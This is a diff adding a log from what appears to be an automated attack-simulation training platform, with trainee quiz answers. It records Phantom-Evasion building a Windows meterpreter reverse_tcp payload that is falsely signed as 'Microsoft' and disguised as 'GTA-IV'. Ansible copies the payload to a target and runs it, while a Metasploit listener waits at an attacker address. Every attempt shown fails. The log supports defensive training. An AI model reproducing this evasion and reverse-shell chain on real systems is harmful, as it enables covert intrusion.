@@ -1,0 +1,172 @@
+2020-06-01 20:38:55,636- session-for-5ed5211a051e140dbc0be369 - INFO - Property Not Found
+2020-06-01 20:39:04,663- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Parsing Scenario....................
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 5, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}]
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - *****************************Check tools status*****************************
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible']
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - ansible = [32mTrue[0m
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - msfconsole = [32mTrue[0m
+2020-06-01 20:39:04,665- session-for-5ed5211a051e140dbc0be369 - INFO - ansible = [32mTrue[0m
+2020-06-01 20:39:04,666- session-for-5ed5211a051e140dbc0be369 - INFO - ************************Updating Session Tactics**********************
+2020-06-01 20:39:04,670- session-for-5ed5211a051e140dbc0be369 - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 20:39:04,674- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 20:39:04,674- session-for-5ed5211a051e140dbc0be369 - INFO - Reason: payload generation
+2020-06-01 20:39:15,146- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 1
+2020-06-01 20:39:15,804- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:39:16,362- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:39:17,923- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert payload number: 3
+2020-06-01 20:39:18,080- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:39:18,238- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 20:39:18,290- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LPORT: 49455
+2020-06-01 20:39:18,342- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert output filename: GTA-IV
+2020-06-01 20:39:18,894- session-for-5ed5211a051e140dbc0be369 - INFO - Add multiple processes behaviour: n
+2020-06-01 20:39:20,163- session-for-5ed5211a051e140dbc0be369 - INFO - Strip executable\?: y
+2020-06-01 20:39:21,725- session-for-5ed5211a051e140dbc0be369 - INFO - Sign executable\?: y
+2020-06-01 20:39:21,777- session-for-5ed5211a051e140dbc0be369 - INFO - use already existing certificate: y
+2020-06-01 20:39:21,829- session-for-5ed5211a051e140dbc0be369 - INFO - Select a Certificate: 1
+2020-06-01 20:39:21,881- session-for-5ed5211a051e140dbc0be369 - INFO - Insert sign software description: Microsoft
+2020-06-01 20:39:23,179- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:39:23,636- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 0
+2020-06-01 20:39:23,637- session-for-5ed5211a051e140dbc0be369 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 20:39:23,638- session-for-5ed5211a051e140dbc0be369 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 20:39:23,638- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 20:39:34,534- session-for-5ed5211a051e140dbc0be369 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 20:39:34,535- session-for-5ed5211a051e140dbc0be369 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 20:39:34,535- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 20:39:34,539- session-for-5ed5211a051e140dbc0be369 - INFO - No Exceptions Found
+2020-06-01 20:39:34,558- session-for-5ed5211a051e140dbc0be369 - INFO - post not needed
+2020-06-01 20:39:34,575- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:39:34,575- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:39:34,599- session-for-5ed5211a051e140dbc0be369 - INFO - cid: 7
+2020-06-01 20:39:34,599- session-for-5ed5211a051e140dbc0be369 - INFO - Starting Another Thread
+2020-06-01 20:39:34,600- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 20:39:36,266- metasploit-thread - INFO - {'job_id': 13, 'uuid': 'mqalewij'}
+2020-06-01 20:39:36,273- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:39,284- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:39,605- session-for-5ed5211a051e140dbc0be369 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 20:39:39,607- session-for-5ed5211a051e140dbc0be369 - INFO - Appending Generalize questions_answers
+2020-06-01 20:39:39,607- session-for-5ed5211a051e140dbc0be369 - INFO - Appending scenario-specific questions_answers
+2020-06-01 20:39:39,608- session-for-5ed5211a051e140dbc0be369 - INFO - *****************************Questions*****************************
+2020-06-01 20:39:39,608- session-for-5ed5211a051e140dbc0be369 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 20:39:39,609- session-for-5ed5211a051e140dbc0be369 - INFO - *****************************Actual Answers*****************************
+2020-06-01 20:39:39,609- session-for-5ed5211a051e140dbc0be369 - INFO - ['192.168.18.61', 49455, '%USERPROFILE%\\Downloads\\', 'GTA-IV']
+2020-06-01 20:39:39,615- session-for-5ed5211a051e140dbc0be369 - INFO - evaluation id:5ed5211a051e140dbc0be36a
+2020-06-01 20:39:39,616- session-for-5ed5211a051e140dbc0be369 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 20:39:39,624- session-for-5ed5211a051e140dbc0be369 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 20:39:39,624- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 20:39:39,641- session-for-5ed5211a051e140dbc0be369 - INFO - command is GTA-IV.exe
+2020-06-01 20:39:39,642- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 20:39:39,642- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Going 1 step back........................
+2020-06-01 20:39:39,649- session-for-5ed5211a051e140dbc0be369 - INFO - Exception Successfully Raised
+2020-06-01 20:39:39,650- session-for-5ed5211a051e140dbc0be369 - INFO - Exception caught
+2020-06-01 20:39:39,650- session-for-5ed5211a051e140dbc0be369 - INFO - No Exceptions Found
+2020-06-01 20:39:39,670- session-for-5ed5211a051e140dbc0be369 - INFO - post not needed
+2020-06-01 20:39:39,686- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:39:39,687- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:39:39,704- session-for-5ed5211a051e140dbc0be369 - INFO - cid: 8
+2020-06-01 20:39:39,704- session-for-5ed5211a051e140dbc0be369 - INFO - Starting Another Thread
+2020-06-01 20:39:39,704- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 20:39:41,388- metasploit-thread - INFO - {'job_id': 14, 'uuid': 'mglu84by'}
+2020-06-01 20:39:41,394- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:44,404- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:44,710- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 20:39:44,715- session-for-5ed5211a051e140dbc0be369 - INFO - command is GTA-IV.exe
+2020-06-01 20:39:44,716- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 20:39:44,717- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Going 2 step back........................
+2020-06-01 20:39:44,721- session-for-5ed5211a051e140dbc0be369 - INFO - Exception Successfully Raised
+2020-06-01 20:39:44,722- session-for-5ed5211a051e140dbc0be369 - INFO - Exception caught
+2020-06-01 20:39:51,739- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 20:39:51,742- session-for-5ed5211a051e140dbc0be369 - INFO - No Exceptions Found
+2020-06-01 20:39:51,758- session-for-5ed5211a051e140dbc0be369 - INFO - post not needed
+2020-06-01 20:39:51,775- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:39:51,775- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:39:51,791- session-for-5ed5211a051e140dbc0be369 - INFO - cid: 9
+2020-06-01 20:39:51,791- session-for-5ed5211a051e140dbc0be369 - INFO - Starting Another Thread
+2020-06-01 20:39:51,791- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 20:39:53,475- metasploit-thread - INFO - {'job_id': 15, 'uuid': 'c9cxxxiv'}
+2020-06-01 20:39:53,481- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:56,494- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:39:56,796- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 20:39:56,802- session-for-5ed5211a051e140dbc0be369 - INFO - command is GTA-IV.exe
+2020-06-01 20:39:56,803- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 20:39:56,804- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Going 3 step back........................
+2020-06-01 20:39:56,811- session-for-5ed5211a051e140dbc0be369 - INFO - Exception Successfully Raised
+2020-06-01 20:39:56,811- session-for-5ed5211a051e140dbc0be369 - INFO - Exception caught
+2020-06-01 20:39:56,913- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 20:39:56,914- session-for-5ed5211a051e140dbc0be369 - INFO - Reason: payload generation
+2020-06-01 20:39:56,914- session-for-5ed5211a051e140dbc0be369 - INFO - ['LPORT'] option not needed...
+2020-06-01 20:40:07,426- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 1
+2020-06-01 20:40:08,084- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:40:08,642- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:40:10,202- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert payload number: 3
+2020-06-01 20:40:10,359- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:40:10,515- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 20:40:10,566- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LPORT: 49455
+2020-06-01 20:40:10,618- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert output filename: GTA-IV
+2020-06-01 20:40:11,170- session-for-5ed5211a051e140dbc0be369 - INFO - Add multiple processes behaviour: n
+2020-06-01 20:40:12,410- session-for-5ed5211a051e140dbc0be369 - INFO - Strip executable\?: y
+2020-06-01 20:40:13,972- session-for-5ed5211a051e140dbc0be369 - INFO - Sign executable\?: y
+2020-06-01 20:40:14,023- session-for-5ed5211a051e140dbc0be369 - INFO - use already existing certificate: y
+2020-06-01 20:40:14,075- session-for-5ed5211a051e140dbc0be369 - INFO - Select a Certificate: 1
+2020-06-01 20:40:14,126- session-for-5ed5211a051e140dbc0be369 - INFO - Insert sign software description: Microsoft
+2020-06-01 20:40:15,423- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:40:15,880- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 0
+2020-06-01 20:40:15,881- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 20:40:26,117- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 20:40:26,120- session-for-5ed5211a051e140dbc0be369 - INFO - No Exceptions Found
+2020-06-01 20:40:26,137- session-for-5ed5211a051e140dbc0be369 - INFO - post not needed
+2020-06-01 20:40:26,153- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:40:26,153- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:40:26,194- session-for-5ed5211a051e140dbc0be369 - INFO - cid: 10
+2020-06-01 20:40:26,194- session-for-5ed5211a051e140dbc0be369 - INFO - Starting Another Thread
+2020-06-01 20:40:26,196- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 20:40:28,051- metasploit-thread - INFO - {'job_id': 16, 'uuid': 'wxg9qrgt'}
+2020-06-01 20:40:28,057- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:40:31,068- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:40:31,201- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 20:40:31,208- session-for-5ed5211a051e140dbc0be369 - INFO - command is GTA-IV.exe
+2020-06-01 20:40:31,209- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 20:40:31,209- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Going 4 step back........................
+2020-06-01 20:40:31,236- session-for-5ed5211a051e140dbc0be369 - INFO - Exception Successfully Raised
+2020-06-01 20:40:31,237- session-for-5ed5211a051e140dbc0be369 - INFO - Exception caught
+2020-06-01 20:40:31,338- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 20:40:31,338- session-for-5ed5211a051e140dbc0be369 - INFO - Reason: payload generation
+2020-06-01 20:40:31,339- session-for-5ed5211a051e140dbc0be369 - INFO - ['LPORT'] option not needed...
+2020-06-01 20:40:41,827- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 1
+2020-06-01 20:40:42,485- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:40:43,043- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 2
+2020-06-01 20:40:44,603- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert payload number: 3
+2020-06-01 20:40:44,760- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:40:44,918- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 20:40:44,969- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert LPORT: 49455
+2020-06-01 20:40:45,021- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert output filename: GTA-IV
+2020-06-01 20:40:45,573- session-for-5ed5211a051e140dbc0be369 - INFO - Add multiple processes behaviour: n
+2020-06-01 20:40:46,811- session-for-5ed5211a051e140dbc0be369 - INFO - Strip executable\?: y
+2020-06-01 20:40:48,372- session-for-5ed5211a051e140dbc0be369 - INFO - Sign executable\?: y
+2020-06-01 20:40:48,424- session-for-5ed5211a051e140dbc0be369 - INFO - use already existing certificate: y
+2020-06-01 20:40:48,475- session-for-5ed5211a051e140dbc0be369 - INFO - Select a Certificate: 1
+2020-06-01 20:40:48,526- session-for-5ed5211a051e140dbc0be369 - INFO - Insert sign software description: Microsoft
+2020-06-01 20:40:49,824- session-for-5ed5211a051e140dbc0be369 - INFO - Press Enter to continue: 
+2020-06-01 20:40:50,282- session-for-5ed5211a051e140dbc0be369 - INFO - Please insert option: 0
+2020-06-01 20:40:50,283- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 20:40:59,432- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 20:40:59,448- session-for-5ed5211a051e140dbc0be369 - INFO - No Exceptions Found
+2020-06-01 20:40:59,465- session-for-5ed5211a051e140dbc0be369 - INFO - post not needed
+2020-06-01 20:40:59,482- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:40:59,482- session-for-5ed5211a051e140dbc0be369 - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:40:59,500- session-for-5ed5211a051e140dbc0be369 - INFO - cid: 11
+2020-06-01 20:40:59,500- session-for-5ed5211a051e140dbc0be369 - INFO - Starting Another Thread
+2020-06-01 20:40:59,500- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 20:41:01,352- metasploit-thread - INFO - {'job_id': 17, 'uuid': '2f5bpnn1'}
+2020-06-01 20:41:01,359- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:41:04,372- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:41:04,503- session-for-5ed5211a051e140dbc0be369 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 20:41:04,509- session-for-5ed5211a051e140dbc0be369 - INFO - command is GTA-IV.exe
+2020-06-01 20:41:04,510- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Ending Attack due to bulk of errors
+2020-06-01 20:41:04,511- session-for-5ed5211a051e140dbc0be369 - INFO - ************************Raising Incomplete Error Flag and Ending Session**********************
+2020-06-01 20:41:04,529- session-for-5ed5211a051e140dbc0be369 - INFO - Flag raised in attack session.
+2020-06-01 20:41:04,529- session-for-5ed5211a051e140dbc0be369 - CRITICAL - Final Exception, Execution Stopped for session id5ed5211a051e140dbc0be369
+2020-06-01 20:41:04,530- session-for-5ed5211a051e140dbc0be369 - INFO - Exception Successfully Raised
+2020-06-01 20:41:04,530- session-for-5ed5211a051e140dbc0be369 - INFO - Exception caught
+2020-06-01 20:41:04,531- session-for-5ed5211a051e140dbc0be369 - INFO - ....................Destroying Session.....................................
+2020-06-01 20:41:04,531- session-for-5ed5211a051e140dbc0be369 - INFO - ....................No Session available to destroy........................
